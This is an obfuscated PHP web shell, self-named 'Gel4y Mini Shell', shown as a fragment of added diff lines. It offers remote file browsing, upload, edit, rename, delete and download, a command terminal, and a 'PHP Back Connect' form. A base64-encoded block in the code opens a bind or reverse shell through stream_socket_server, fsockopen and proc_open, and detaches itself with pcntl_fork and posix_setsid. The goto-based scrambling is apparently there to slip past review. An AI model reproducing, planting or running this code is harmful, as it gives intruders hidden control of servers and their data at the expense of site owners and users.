+echo "<tr>\n\t        <td><a href=\"?l=" . rxefbN6HEy($EEfZ6TZDdb, 0) . "&a=" . rXEFbn6HEY("view", 0) . "&n=" . RxEFBN6heY($rn5LpfN5ed, 0) . "\" data-toggle=\"tooltip\" data-placement=\"auto\" title=\"Latest modify on " . date("Y-m-d H:i", filemtime("{$EEfZ6TZDdb}/{$rn5LpfN5ed}")) . "\"><i class=\"fa fa-fw fa-file" . ($_SERVER["SCRIPT_FILENAME"] == "{$EEfZ6TZDdb}/{$rn5LpfN5ed}" ? " text-danger" : "") . "\"></i> {$rn5LpfN5ed}</a></td>\n\t        <td>{$nWFrSLIRip}</td>\n\t        <td><font color=\"" . (is_writable("{$EEfZ6TZDdb}/{$rn5LpfN5ed}") ? "#00ff00" : (!is_readable("{$EEfZ6TZDdb}/{$rn5LpfN5ed}") ? "red" : null)) . "\">" . HRXkaTtukj("{$EEfZ6TZDdb}/{$rn5LpfN5ed}") . "</font></td>\n\t        <td>\n\t          <div class=\"d-flex justify-content-between\">\n\t            <a href=\"?l=" . RXeFbN6HEY($EEfZ6TZDdb, 0) . "&a=" . rxeFBN6hey("edit", 0) . "&n=" . RXeFBN6HEY($rn5LpfN5ed, 0) . "\" data-toggle=\"tooltip\" data-placement=\"auto\" title=\"Edit\"><i class=\"fa fa-fw fa-edit\"></i></a>\n\t            <a href=\"?l=" . RXeFBn6hey($EEfZ6TZDdb, 0) . "&a=" . RXeFBn6HeY("rename", 0) . "&n=" . rXEfbN6hEY($rn5LpfN5ed, 0) . "&t=f\" data-toggle=\"tooltip\" data-placement=\"auto\" title=\"Rename\"><i class=\"fa fa-fw fa-pencil\"></i></a>\n\t            <a href=\"?l=" . rxeFbN6HEy($EEfZ6TZDdb, 0) . "&n=" . RXEFbN6HeY($rn5LpfN5ed, 0) . "&download" . "\" data-toggle=\"tooltip\" data-placement=\"auto\" title=\"Download\"><i class=\"fa fa-fw fa-download\"></i></a>\n\t            <a href=\"?l=" . RxEFBn6Hey($EEfZ6TZDdb, 0) . "&a=" . RXeFbN6heY("delete", 0) . "&n=" . rxEfbN6heY($rn5LpfN5ed, 0) . "\" class=\"delete\" data-type=\"file\" data-toggle=\"tooltip\" data-placement=\"auto\" title=\"Delete\"><i class=\"fa fa-fw fa-trash\"></i></a>\n\t          </div>\n\t        </td></tr>";
+goto oNCyMMeqOT;
+rv2fcrMmui:
+}
+goto se4fG1bBsx;
+zWSkrZzsWq:
+echo "?l=" . rxefBN6Hey($EEfZ6TZDdb, 0) . "&a=" . RXEfBn6HEy("con", 0);
+goto NcDR2cFSK_;
+u_4IaYeVy2:
+echo RxEfbn6Hey($_GET["n"]);
+goto IVRDMHFY4o;
+F7zXLBDEK2:
+$rRwNpSflmI = "\$target = \"{$g9_4Zq7xGB} {$TkCbW35AQi}\";\n{$rRwNpSflmI}";
+goto pqYY95BvuW;
+hZocDUXtgN:
+$rRwNpSflmI = base64_decode("Z290byBQSVdtODsKbFVjUWI6CmZjbG9zZSgkcGlwWzJdKTsKZ290byBUT01NNjsKbzZfbnM6CmV4aXQoMCk7CmdvdG8gZExXZVE7CnJDVnd6OgokZWEgPSBudWxsOwpnb3RvIE9rZ2M4OwpQSVdtODoKZXJyb3JfcmVwb3J0aW5nKDApOwpnb3RvIHdrcktMOwpkTFdlUToKSzFmSnI6CmdvdG8gRVEwZm07CnNnTWNQOgpmY2xvc2UoJHMpOwpnb3RvIFc1eUxiOwpOOGkyYjoKaWYgKCFpbl9hcnJheSgkcGlwWzFdLCAkcmEpKSB7CiAgZ290byB5Q1pzUTsKfQpnb3RvIHV0VUdtOwpjYXQ5MDoKaWYgKCFmdW5jdGlvbl9leGlzdHMoIlwxNjBceDYzXHg2ZVx4NzRceDZjXDEzN1x4NjZceDZmXDE2MlwxNTMiKSkgewogIGdvdG8gQmFhcjA7Cn0KZ290byBDQ3ZNbTsKUFVlRFI6Cm9iX2ltcGxpY2l0X2ZsdXNoKCk7CmdvdG8gUlAweWc7CkF0dEZVOgpleGl0KDEpOwpnb3RvIEVnOWhnOwpLUTFRUjoKJGkgPSBmcmVhZCgkcGlwWzJdLCAkY3MpOwpnb3RvIE1DbmloOwpTUEVaRDoKJHAgPSAkdGFyZ2V0Owpnb3RvIE5SVDNpOwpoWXl6YToKeUNac1E6CmdvdG8gZ29NN007Cm9DbWFNOgpzdHJlYW1fc2V0X3RpbWVvdXQoJHMsIDMwKTsKZ290byBxeVkyVDsKVkRCQXE6CiRzID0gc3RyZWFtX3NvY2tldF9zZXJ2ZXIoIlx4NzRceDYzXDE2MFx4M2FceDJmXHgyZlw2MFw1Nlx4MzBceDJlXHgzMFw1Nlw2MFx4M2EiIC4gJHAsICRlcnJubywgJGVycnN0cik7CmdvdG8gb0NtYU07Ck9odWU4OgppZiAoJHQgPT0gIlx4NjJcMTUxXDE1NlwxNDQiKSB7CiAgZ290byBwZVhlUTsKfQpnb3RvIHBIa2t6Owp0dkVIUjoKWFhCS3Q6CmdvdG8gVDRMRWk7CmFaT0FtOgpmY2xvc2UoJHBpcFsyXSk7CmdvdG8gT0dOT1U7ClEzanZjOgokdCA9ICJcMTQyXDE0MVx4NjNcMTUzIjsKZ290byBRdHhMODsKUEJSM2U6CmZjbG9zZSgkcyk7CmdvdG8gUWZmNlc7Clc1eUxiOgpmY2xvc2UoJHBpcFswXSk7CmdvdG8gazBZcFE7Ck9HTk9VOgpwcm9jX2Nsb3NlKCRwcik7CmdvdG8gTWl4NzU7Ck1DbmloOgpmd3JpdGUoJHMsICRpKTsKZ290byB4dlJTejsKSUlwQzc6CmlmICghdHJ1ZSkgewogIGdvdG8gaVY2blM7Cn0KZ290byBveFFXejsKdHZkSG46CmZ3cml0ZSgkYywgJG0pOwpnb3RvIGIyTW1BOwpPa2djODoKJHNoID0gIlwxNDVceDc4XHg3MFx4NmZceDcyXHg3NFw0MFx4NTRcMTA1XDEyMlx4NGRcNzVceDc4XHg3NFx4NjVcMTYyXDE1NVw3M1wxMjBceDUzXHgzMVx4M2RceDI3XHgyNFwxMjBcMTI3XHg0NFx4M2VcNDdceDNiXHg2NVx4NzhcMTYwXHg2ZlwxNjJceDc0XHgyMFx4NTBcMTIzXDYxXDczXHgyZlx4NjJcMTUxXDE1Nlx4MmZcMTYzXDE1MFw0MFw1NVwxNTEiOwpnb3RvIGRKQk1GOwp1dFVHbToKJGkgPSBmcmVhZCgkcGlwWzFdLCAkY3MpOwpnb3RvIEEyNHRJOwpwczhQaToKZ290byBXQlczUjsKZ290byB1WXhiTzsKY0JwaWo6CmlmIChjb3VudCgkdGFyZ2V0cykgPT0gMSkgewogIGdvdG8gYzZ2bEM7Cn0KZ290byBEU2tUbjsKZ29NN006CmlmICghaW5fYXJyYXkoJHBpcFsyXSwgJHJhKSkgewogIGdvdG8gT0FLb1I7Cn0KZ290byBOOU91MTsKbk9GNDc6CiR3YSA9IG51bGw7CmdvdG8gckNWd3o7CnVZeGJPOgpGN0pPcDoKZ290byBqaEVkMzsKUXR4TDg6CldCVzNSOgpnb3RvIGNhdDkwOwpwd3FhSzoKc3RyZWFtX3NldF9ibG9ja2luZygkcGlwWzBdLCAwKTsKZ290byBJYXFISTsKTlJUM2k6CiRoID0gJyc7CmdvdG8gSzlzeVA7Cmk2aUwxOgpmd3JpdGUoJHBpcFswXSwgJGkpOwpnb3RvIE40VUlDOwpmdWZwWDoKZXhpdCgxKTsKZ290byBReDFLVTsKcXlZMlQ6CiRjID0gc3RyZWFtX3NvY2tldF9hY2NlcHQoJHMpOwpnb3RvIHR2ZEhuOwpkSkJNRjoKJG0gPSAiXHg0N1wxNDVcMTU0XHgzNFx4NzlcNDBcMTIzXHg2OFwxNDVcMTU0XHg2Y1x4YSI7CmdvdG8gY0JwaWo7CkQzUnVoOgpzdHJlYW1fc2V0X2Jsb2NraW5nKCRjLCAwKTsKZ290byB5RHhyazsKWU05MEg6CiRkcyA9IGFycmF5KDAgPT4gYXJyYXkoIlx4NzBcMTUxXHg3MFx4NjUiLCAiXHg3MiIpLCAxID0+IGFycmF5KCJceDcwXDE1MVwxNjBcMTQ1IiwgIlwxNjciKSwgMiA9PiBhcnJheSgiXDE2MFx4NjlcMTYwXHg2NSIsICJcMTY3IikpOwpnb3RvIEFZaGtlOwp1RWdWRjoKZXhpdCgxKTsKZ290byBtNGdrbDsKTVpCcWw6CmZjbG9zZSgkcGlwWzFdKTsKZ290byBhWk9BbTsKSzlzeVA6CiR0ID0gIlx4NjJceDY5XHg2ZVwxNDQiOwpnb3RvIHBzOFBpOwpyV3lnMjoKZ290byB2ZzFKMTsKZ290byB0dkVIUjsKdEszM186CmlmIChpc19yZXNvdXJjZSgkcHIpKSB7CiAgZ290byBvUnRUMDsKfQpnb3RvIGZ1ZnBYOwpZMGNIajoKJHMgPSBmc29ja29wZW4oJGgsICRwLCAkZW4sICRlcywgMzApOwpnb3RvIEg3bTNlOwpFZzloZzoKczVkN186CmdvdG8gcHdxYUs7ClQ0TEVpOgokcmEgPSBhcnJheSgkYywgJHBpcFsxXSwgJHBpcFsyXSk7CmdvdG8gek9mOUQ7Clg3a1UzOgppZiAoISgkcGlkID09IC0xKSkgewogIGdvdG8gVkIzX047Cn0KZ290byBkMm15ZDsKUzBNTHo6CkJhYXIwOgpnb3RvIE9odWU4OwpReDFLVToKb1J0VDA6CmdvdG8gdGVqbUU7Cm00Z2tsOgpMaFA2QjoKZ290byBTME1MejsKTjRVSUM6CkNHSTQwOgpnb3RvIE44aTJiOwpkMm15ZDoKZXhpdCgxKTsKZ290byBWaDM5QTsKTjlPdTE6CiRpID0gZnJlYWQoJHBpcFsyXSwgJGNzKTsKZ290byBVa1M2ejsKTWl4NzU6CmdvdG8gdFhjSV87CmdvdG8gc3hHbTA7CnBIa2t6OgppZiAoJHQgPT0gIlx4NjJceDYxXDE0M1x4NmIiKSB7CiAgZ290byBqVUhKNDsKfQpnb3RvIHBVaF9MOwpkbW1FSDoKJGkgPSBmcmVhZCgkcGlwWzFdLCAkY3MpOwpnb3RvIGxncm4yOwpoVHJWaToKVDh4b1E6CmdvdG8gY2VIbnQ7CkQ4VlpFOgppZiAoIXRydWUpIHsKICBnb3RvIHZnMUoxOwp9CmdvdG8gSF9MSHk7CnZDOUswOgpzdHJlYW1fc2VsZWN0KCRyYSwgJHdhLCAkZWEsIG51bGwpOwpnb3RvIHVoUFNyOwpUT01NNjoKcHJvY19jbG9zZSgkcHIpOwpnb3RvIGNIeXJYOwpRV18yVDoKJHByID0gcHJvY19vcGVuKCRzaCwgJGRzLCAkcGlwKTsKZ290byB0SzMzXzsKUWZmNlc6CmZjbG9zZSgkYyk7CmdvdG8gdVduaUk7CnpIXzNuOgppZiAoIWluX2FycmF5KCRwaXBbMV0sICRyYSkpIHsKICBnb3RvIFQ4eG9ROwp9CmdvdG8gZG1tRUg7Cld1WmpoOgokY3MgPSAxMzM3Owpnb3RvIG5PRjQ3OwpzeEdtMDoKalVISjQ6CmdvdG8gWTBjSGo7ClJQMHlnOgokdGFyZ2V0cyA9IGV4cGxvZGUoIlw0MCIsICR0YXJnZXQpOwpnb3RvIFd1WmpoOwpFUTBmbToKaWYgKCEocG9zaXhfc2V0c2lkKCkgPT0gLTEpKSB7CiAgZ290byBMaFA2QjsKfQpnb3RvIHVFZ1ZGOwpDQ3ZNbToKJHBpZCA9IHBjbnRsX2ZvcmsoKTsKZ290byBYN2tVMzsKRTIyYkw6CmM2dmxDOgpnb3RvIFNQRVpEOwpBWWhrZToKJHByID0gcHJvY19vcGVuKCRzaCwgJGRzLCAkcGlwKTsKZ290byBoMWhENDsKSF9MSHk6CmlmICghKGZlb2YoJGMpIHx8IGZlb2YoJHBpcFsxXSkpKSB7CiAgZ290byBYWEJLdDsKfQpnb3RvIHJXeWcyOwpwVWhfTDoKZ290byB0WGNJXzsKZ290byB3X3p4UTsKTTdNSnc6CiRpID0gZnJlYWQoJHMsICRjcyk7CmdvdG8gdW4yQm87CnpPZjlEOgpzdHJlYW1fc2VsZWN0KCRyYSwgJHdhLCAkZWEsIG51bGwpOwpnb3RvIFAySE14OwpJYXFISToKc3RyZWFtX3NldF9ibG9ja2luZygkcGlwWzFdLCAwKTsKZ290byB3b0FaMzsKQTZNRjA6CiRpID0gZnJlYWQoJGMsICRjcyk7CmdvdG8gaTZpTDE7Cmxncm4yOgpmd3JpdGUoJHMsICRpKTsKZ290byBoVHJWaTsKVjRlS2c6CmlmICghJHBpZCkgewogIGdvdG8gSzFmSnI7Cn0KZ290byBvNl9uczsKWDJhdVg6CmdvdG8gV0JXM1I7CmdvdG8gRTIyYkw7ClZoMzlBOgpWQjNfTjoKZ290byBWNGVLZzsKSDdtM2U6CmZ3cml0ZSgkcywgJG0pOwpnb3RvIFlNOTBIOwpVa1M2ejoKZndyaXRlKCRjLCAkaSk7CmdvdG8gbEtoOHU7ClBseER1OgpzdHJlYW1fc2V0X2Jsb2NraW5nKCRwaXBbMV0sIDApOwpnb3RvIEs3NnNnOwpsS2g4dToKT0FLb1I6CmdvdG8gbl81VU87CnZtMDl0OgppVjZuUzoKZ290byBzZ01jUDsKeUR4cms6ClY1RFpfOgpnb3RvIEQ4VlpFOwp3b0FaMzoKc3RyZWFtX3NldF9ibG9ja2luZygkcGlwWzJdLCAwKTsKZ290byBqNm1KVzsKZVY1V1U6ClFETDlHOgpnb3RvIHpIXzNuOwp1bjJCbzoKZndyaXRlKCRwaXBbMF0sICRpKTsKZ290byBlVjVXVTsKQTI0dEk6CmZ3cml0ZSgkYywgJGkpOwpnb3RvIGhZeXphOwppZVAzMzoKJHJhID0gYXJyYXkoJHMsICRwaXBbMV0sICRwaXBbMl0pOwpnb3RvIHZDOUswOwpoMWhENDoKaWYgKGlzX3Jlc291cmNlKCRwcikpIHsKICBnb3RvIHM1ZDdfOwp9CmdvdG8gQXR0RlU7CmNPb0JlOgpXUW1qXzoKZ290byBJSXBDNzsKRUtzaXU6CmdvdG8gaVY2blM7CmdvdG8gUFFUV0M7Cm5fNVVPOgpnb3RvIFY1RFpfOwpnb3RvIElDd2UzOwpiMk1tQToKJGRzID0gYXJyYXkoMCA9PiBhcnJheSgiXDE2MFwxNTFceDcwXHg2NSIsICJceDcyIiksIDEgPT4gYXJyYXkoIlwxNjBcMTUxXHg3MFwxNDUiLCAiXDE2NyIpLCAyID0+IGFycmF5KCJcMTYwXDE1MVwxNjBcMTQ1IiwgIlwxNjciKSk7CmdvdG8gUVdfMlQ7CndrcktMOgpzZXRfdGltZV9saW1pdCgwKTsKZ290byBQVWVEUjsKSzc2c2c6CnN0cmVhbV9zZXRfYmxvY2tpbmcoJHBpcFsyXSwgMCk7CmdvdG8gRDNSdWg7CnVXbmlJOgpmY2xvc2UoJHBpcFswXSk7CmdvdG8gTVpCcWw7ClBRVFdDOgpnakhfMToKZ290byBpZVAzMzsKajZtSlc6CnN0cmVhbV9zZXRfYmxvY2tpbmcoJHMsIDApOwpnb3RvIGNPb0JlOwp4dlJTejoKd1NOX3Q6CmdvdG8gUGJVczk7Cm94UVd6OgppZiAoIShmZW9mKCRzKSB8fCBmZW9mKCRwaXBbMV0pKSkgewogIGdvdG8gZ2pIXzE7Cn0KZ290byBFS3NpdTsKdWhQU3I6CmlmICghaW5fYXJyYXkoJHMsICRyYSkpIHsKICBnb3RvIFFETDlHOwp9CmdvdG8gTTdNSnc7CnRlam1FOgpzdHJlYW1fc2V0X2Jsb2NraW5nKCRwaXBbMF0sIDApOwpnb3RvIFBseER1OwpEU2tUbjoKaWYgKGNvdW50KCR0YXJnZXRzKSA9PSAyKSB7CiAgZ290byBGN0pPcDsKfQpnb3RvIFgyYXVYOwpJQ3dlMzoKdmcxSjE6CmdvdG8gUEJSM2U7CmswWXBROgpmY2xvc2UoJHBpcFsxXSk7CmdvdG8gbFVjUWI7ClAySE14OgppZiAoIWluX2FycmF5KCRjLCAkcmEpKSB7CiAgZ290byBDR0k0MDsKfQpnb3RvIEE2TUYwOwpoWmk4ejoKJGggPSAkdGFyZ2V0c1sxXTsKZ290byBRM2p2YzsKY2VIbnQ6CmlmICghaW5fYXJyYXkoJHBpcFsyXSwgJHJhKSkgewogIGdvdG8gd1NOX3Q7Cn0KZ290byBLUTFRUjsKd196eFE6CnBlWGVROgpnb3RvIFZEQkFxOwpqaEVkMzoKJHAgPSAkdGFyZ2V0c1swXTsKZ290byBoWmk4ejsKUGJVczk6CmdvdG8gV1Ftal87CmdvdG8gdm0wOXQ7CmNIeXJYOgp0WGNJXzo=");
+goto F7zXLBDEK2;
+eGmrGMmM7f:
+header("Content-Transfer-Encoding: Binary");
+goto dFM2sYAJlJ;
+MMrXTvXqy7:
+?></li>
+</ul>
+</div>
+<form method="post" enctype="multipart/form-data">
+<div class="input-group mb-1">
+<div class="custom-file">
+<input type="file" name="f[]" class="custom-file-input" onchange="this.form.submit()" multiple>
+<label class="custom-file-label rounded-0 bg-transparent text-light">Choose file</label>
+</div>
+</div>
+</form>
+<?php
+goto jz_2zEOwzt;
+vTj5YprhCZ:
+echo '<div class="my-3">';
+goto TTVVoj2zH2;
+X31kOqdTx7:
+?></h5>
+<form method="post">
+<div class="form-group">
+<label for="n">Name :</label><input type="text" name="n" id="n" class="form-control" value="<?php
+goto qRqOKZqPSD;
+n6KlS76u_Y:
+if ($hzOvuJeFzz == "cfile") {
+goto UVK2cx0wsu;
+}
+goto iau78ljYgH;
+HD1w0oiEBZ:
+goto AmZ_WHgxlE;
+goto feaBlZ7eEU;
+OS5ItmR5yc:
+goto kKHSQjgn8i;
+goto wrEbKHulxs;
+gl7Tq3BnOV:
+oC49Ak4Qpk:
+goto NGkY1VE6zp;
+JaRFY01HAP:
+if ($hzOvuJeFzz == 'rename') {
+goto b_Aq_femsk;
+}
+goto tMkG3v_JBI;
+p59Ko9RToC:
+?>
+</div>
+</div>
+<article class="bg-dark border table-responsive">
+<?php
+goto TnhMIgmoXz;
+YJ142eHcuW:
+echo $_SERVER["REMOTE_ADDR"];
+goto errh3t4_bj;
+MAe0YHyLaa:
+if (!($_GET["t"] == "d")) {
+goto Bip4SkFlwd;
+}
+goto qvSYZCVNk0;
+d5oIa6c6mo:
+echo rXEfBN6HEy($_GET["n"]);
+goto EyVdz_YRmU;
+YYviAIE2go:
+define("FmHaNw7Sd4", "Gel4y Mini Shell");
+goto aebgRtztCr;
+NGkY1VE6zp:
+?>
+<table class="table table-hover table-borderless table-sm">
+<thead class="text-light">
+<tr>
+<th>Name</th>
+<th>Size</th>
+<th>Permission</th>
+<th>Action</th>
+</tr>
+</thead>
+<tbody>
+<?php
+goto jP2j_WsoIN;
+IWDRDymnkm:
+?></a></h3>
+</div>
+<div>
+<span>PHP Version: <?php
+goto zvl7rFBRXM;
+SdQQ2vh1pk:
+?>"><i class="fa fa-terminal"></i></a>
+</div>
+</div>
+<div class="border-top">
+<ul style="list-style:none;" class="m-0 p-0">
+<li><b>Server</b>: <?php
+goto MWacVfk2Z9;
+MTQ6j3p_JU:
+header("Content-disposition: attachment; filename=\"" . rXEfbn6hey($_GET["n"]) . "\"");
+goto DnMdqAJ3M9;
+ZNQuKDPR_4:
+function bb5inVuGyH($TyHtfHVLGo, $IqAFWYu448, $JpGr27PQID = 1) {
+$F3VGKH3ww0 = $JpGr27PQID == 1 ? "success" : "error";
+echo "<script>swal({title: \"{$F3VGKH3ww0}\", text: \"{$TyHtfHVLGo}\", icon: \"{$F3VGKH3ww0}\"}).then((btnClick) => {if(btnClick){document.location.href=\"?l=" . $IqAFWYu448 . "\"}})</script>";
+}
+goto aEJlf18Qtu;
+iQnuU7UbQZ:
+$j78MPlSKil = $j6fm9JkXX3->open($TQjF6JN0Xn[$IKiphkRa67]);
+goto knjkHswo6U;
+LVUXJeDOyh:
+isset($_POST["s"]) ? file_put_contents($EEfZ6TZDdb . '/' . rXefBN6HeY($_GET["n"]), $_POST["ctn"]) ? bb5InvUgYH("file contents changed successfully", rXefbN6heY($EEfZ6TZDdb, 0) . "&a=" . RXeFbN6Hey("view", 0) . "&n={$_GET["n"]}") : BB5INVUgYh("file contents failed to change", RxEFBN6hey($EEfZ6TZDdb, 0), 0) : null;
+goto Xzf4iJyVK1;
+torkRF7nBa:
+wBRwvY136L:
+goto Hqjr9ld8se;
+EfxIdbdntP:
+?>
+<h5>PHP Back Connect</h5>
+<form method="post">
+<div class="input-group mb-3">
+<input type="text" name="ip" placeholder="<?php
+goto YJ142eHcuW;
+OyonV_aXfE:
+?></span><br>
+<a href="<?php
+goto PaYSwvYogS;
+dbYRcKsPIp:
+goto ZBWF6RSxh7;
+goto neVn1XNWmB;
+tMkG3v_JBI:
+if ($hzOvuJeFzz == 'view') {
+goto ZKB22Ixten;
+}
+goto Vdz113nHJZ;
+wKFr1pnzc8:
+if (!file_exists($IqAFWYu448)) {
+goto W3ggH6skqX;
+}
+goto QFdg_eyOVo;
+ynEoAvZ7Ef:
+if (move_uploaded_file($Dfdl9lkULa[$IKiphkRa67], $TQjF6JN0Xn[$IKiphkRa67])) {
+goto bBFoGpk2eg;
+}
+goto F9xmKW7KdV;
+fhYGKduull:
+function q0wfVKUjRs($Isvtvo_Khk) {
+goto Uub4h9gkCq;
+ulKBIpyXfr:
+p9yRrj0I9L:
+goto n3O8FXbtxz;
+RMYz6RC3Ah:
+return;
+goto ulKBIpyXfr;
+Uub4h9gkCq:
+global $dYmVY71pVg;
+goto r92XOqmxLW;
+iPuafV0c4h:
+t5mcNHryHj:
+goto Arp7pYvHSx;
+r92XOqmxLW:
+if (!(trim(pathinfo($Isvtvo_Khk, PATHINFO_BASENAME), '.') === '')) {
+goto p9yRrj0I9L;
+}
+goto RMYz6RC3Ah;
+LTSk29_TNd:
+goto t_3eBussG0;
+goto iPuafV0c4h;
+TrTjxe9V1Z:
+t_3eBussG0:
+goto Lsc91SF1NQ;
+n3O8FXbtxz:
+if (is_dir($Isvtvo_Khk)) {
+goto t5mcNHryHj;
+}
+goto tzw5ULHmNH;
+Arp7pYvHSx:
+array_map("deldir", glob($Isvtvo_Khk . DIRECTORY_SEPARATOR . '{,.}*', GLOB_BRACE | GLOB_NOSORT));
+goto W0MZdB17mR;
+tzw5ULHmNH:
+unlink($Isvtvo_Khk);
+goto LTSk29_TNd;
+W0MZdB17mR:
+rmdir($Isvtvo_Khk);
+goto TrTjxe9V1Z;
+Lsc91SF1NQ:
+}
+goto pd2Xp8eNUU;
+uLfgP7Khd1:
+lgFAN1_7Jm:
+goto cS5buQoIBP;
+JkRKETx2SF:
+if (!($IKiphkRa67 < count($TQjF6JN0Xn))) {
+goto HmX9zWMF6z;
+}
+goto Kv3eqCCcFx;
+WNq6fySumu:
+NetExxORKl:
+goto z_nhs7Cbn7;
+aebgRtztCr:
+if (isset($_GET['l'])) {
+goto kMsRr8KO2i;
+}
+goto L3Ih6C_82z;
+s00fzLO5Yl:
+echo htmlspecialchars(file_get_contents($EEfZ6TZDdb . '/' . RxEfbN6hEy($_GET["n"])));
+goto PigAhONo2f;
+mfVsx6oHSn:
+foreach ($WekN4aubDI as $x42dyPJI_Q => $iIMh47ezZF) {
+goto rj2MyZrB7k;
+o5iQ8gJvU5:
+goto J4jLfCminm;
+goto K8SqFDrXtg;
+NXqPv90VJX:
+if (!($IKiphkRa67 != $x42dyPJI_Q)) {
+goto ORgV2SAthb;
+}
+goto jM_WWULfOi;
+lEe_5VWrji:
+prNiQDFSWd:
+goto bzTtMV0YbX;
+kqueK2Wcit:
+goto VcWvq3YT7y;
+goto lEe_5VWrji;
+K8SqFDrXtg:
+WgxzZTQFWr:
+goto EqrSyJAzqs;
+lrebfMCSex:
+$IKiphkRa67 = 0;
+goto zLrS5rFG3r;
+DYw5CkpSoV:
+if (!($iIMh47ezZF == "")) {
+goto WgxzZTQFWr;
+}
+goto o5iQ8gJvU5;
+e3PJBKFEd2:
+$IKiphkRa67++;
+goto kqueK2Wcit;
+WyFtfssQJR:
+J4jLfCminm:
+goto QGOp2JL0z3;
+TSaw27ioP1:
+goto J4jLfCminm;
+goto Qd38t26_IT;
+zbZV4IrRXr:
+ORgV2SAthb:
+goto g1Pvr70JqD;
+zLrS5rFG3r:
+VcWvq3YT7y:
+goto dv4oXQmaUz;
+rj2MyZrB7k:
+if (!($x42dyPJI_Q == 0 && $iIMh47ezZF == "")) {
+goto WsglBdtDxt;
+}
+goto R5q5By1332;
+R5q5By1332:
+echo "<a href=\"?l=2f\">~</a>/";
+goto TSaw27ioP1;
+Qd38t26_IT:
+WsglBdtDxt:
+goto DYw5CkpSoV;
+d9YYcNyoqr:
+echo rxEFbn6hey($WekN4aubDI[$IKiphkRa67], 0);
+goto NXqPv90VJX;
+g1Pvr70JqD:
+xdjW07QcoA:
+goto e3PJBKFEd2;
+jM_WWULfOi:
+echo "2f";
+goto zbZV4IrRXr;
+bzTtMV0YbX:
+echo "\">{$iIMh47ezZF}</a>/";
+goto WyFtfssQJR;
+dv4oXQmaUz:
+if (!($IKiphkRa67 <= $x42dyPJI_Q)) {
+goto prNiQDFSWd;
+}
+goto d9YYcNyoqr;
+EqrSyJAzqs:
+echo "<a href=\"?l=";
+goto lrebfMCSex;
+QGOp2JL0z3:
+}
+goto WX3PBtaAK3;
+MOs0Lw2QRZ:
+goto ZBWF6RSxh7;
+goto pzkU10IQiS;
+ZPaDeX38qY:
+goto y8tasQLJHv;
+goto gl7Tq3BnOV;
+neVn1XNWmB:
+ZKB22Ixten:
+goto egAEX13geb;
+gtEtp66eA1:
+W3ggH6skqX:
+goto EKT_1bSizy;
+deRzU3bq7h:
+BB5InVuGyh("folder deleted successfully", rxEFbN6Hey($EEfZ6TZDdb, 0));
+goto pyjFZoGGnB;
+F9xmKW7KdV:
+Bb5iNVugyH("file failed to upload", rXeFBN6HeY($EEfZ6TZDdb, 0), 0);
+goto OS5ItmR5yc;
+EKT_1bSizy:
+Bb5inVuGyH("file deleted successfully", RXEfbn6heY($EEfZ6TZDdb, 0));
+goto k5kZqV10bb;
+cVnxCLLc0W:
+vpkSwTQo6s:
+goto vaea2TNc3W;
+cCui051SEu:
+?></li>
+<li><b>PHP Uname</b>: <?php
+goto FrJD9Jsque;
+MvSZRFs0SS:
+?></pre>
+<form method="post">
+<div class="form-group">
+<input type="text" name="cmd" class="form-control">
+</div>
+</form>
+<?php
+goto ygIr4ZdOgL;
+P7K6f8_xHe:
+?>">
+</div>
+<div class="form-group">
+<button type="submit" name="s" class="btn btn-outline-light rounded-0">Save</button>
+</div>
+</form>
+<?php
+goto TGAVCVIxJL;
+YSarmTalmX:
+kKHSQjgn8i:
+goto torkRF7nBa;
+wrEbKHulxs:
+bBFoGpk2eg:
+goto DsIF5JU9Pz;
+EdwYtsCOvQ:
+goto ZBWF6RSxh7;
+goto rPHci82Pdj;
+tJJFzbSKwD:
+Bb5inVUGYh("file uploaded successfully", RxEfbn6heY($EEfZ6TZDdb, 0));
+goto YSarmTalmX;
+s2A6_q8Isn:
+Bb5INvUgYh("failed to delete the folder", RxefbN6HEY($EEfZ6TZDdb, 0), 0);
+goto KvyyfhHz82;
+URqiW6LJpm:
+header("Content-Type: application/octet-stream");
+goto eGmrGMmM7f;
+HAtVYbHdyo:
+$IqAFWYu448 = $EEfZ6TZDdb . '/' . RXefBN6hey($_GET["n"]);
+goto MAe0YHyLaa;
+EY2Ff1XUeK:
+?>"><i class="fa fa-plus"></i><i class="fa fa-file"></i></a> |
+<a href="<?php
+goto zWSkrZzsWq;
+pLaaRpww2m:
+if (!($_GET["t"] == "f")) {
+goto bLvI_Fu3sF;
+}
+goto J6766bT1wk;
+qWSOAipFym:
+echo "?l=" . rxefbn6HeY($EEfZ6TZDdb, 0) . "&a=" . rxEFbN6HEY("term", 0);
+goto SdQQ2vh1pk;
+dNAXwyF5jm:
+WChit6Tjkf:
+goto uZLJEXNBXC;
+Fhxj0LxAwC:
+$g9_4Zq7xGB = $_POST['port'];
+goto hZocDUXtgN;
+k5kZqV10bb:
+pXxft1wW2P:
+goto kPuh3sB7ZW;
+FM1zySo56b:
+if (!file_exists($IqAFWYu448)) {
+goto yLxrotraE3;
+}
+goto s2A6_q8Isn;
+Kv3eqCCcFx:
+$Dfdl9lkULa = $_FILES['f']['tmp_name'];
+goto Pgo80visnY;
+DSgJ4EEwOL:
+?>
+<h5>New folder</h5>
+<form method="post">
+<div class="form-group">
+<label for="n">Name :</label>
+<input name="n" id="n" class="form-control" autocomplete="off">
+</div>
+<div class="form-group">
+<button type="submit" name="s" class="btn btn-outline-light rounded-0">Create</button>
+</div>
+</form>
+<?php
+goto Pb_Plr8szn;
+NcDR2cFSK_:
+?>"><i class="fa fa-usb"></i></a> |
+<a href="<?php
+goto qWSOAipFym;
+J6766bT1wk:
+$IqAFWYu448 = $EEfZ6TZDdb . '/' . RxEFBn6HeY($_GET["n"]);
+goto fpFzgy_AKw;
+rPHci82Pdj:
+N64OxnT9Bh:
+goto vhjTMlZILs;
+EyVdz_YRmU:
+?></span>
+<div class="form-group">
+<label for="ctn">Content :</label><textarea id="ctn" cols="30" rows="10" class="form-control" readonly><?php
+goto LLrd3aAnEA;
+z_nhs7Cbn7:
+?>
+<h5>Edit file</h5>
+<span>File name : <?php
+goto u_4IaYeVy2;
+BhKgAwcXlI:
+echo rand(1, 6) * 1922;
+goto uuEMYRcWJf;
+LLrd3aAnEA:
+echo htmlspecialchars(file_get_contents($EEfZ6TZDdb . '/' . rXEFBN6HeY($_GET["n"])));
+goto WQ5FRO1vHE;
+pyjFZoGGnB:
+jJAOZDhhff:
+goto FFNAjFboph;
+h3GEWWTVgD:
+if (!isset($_GET["download"])) {
+goto ewlVh3jO7D;
+}
+goto URqiW6LJpm;
+wlhV36GSCm:
+$j6fm9JkXX3->close();
+goto YtyLK4CiZm;
+Kf_pWcks49:
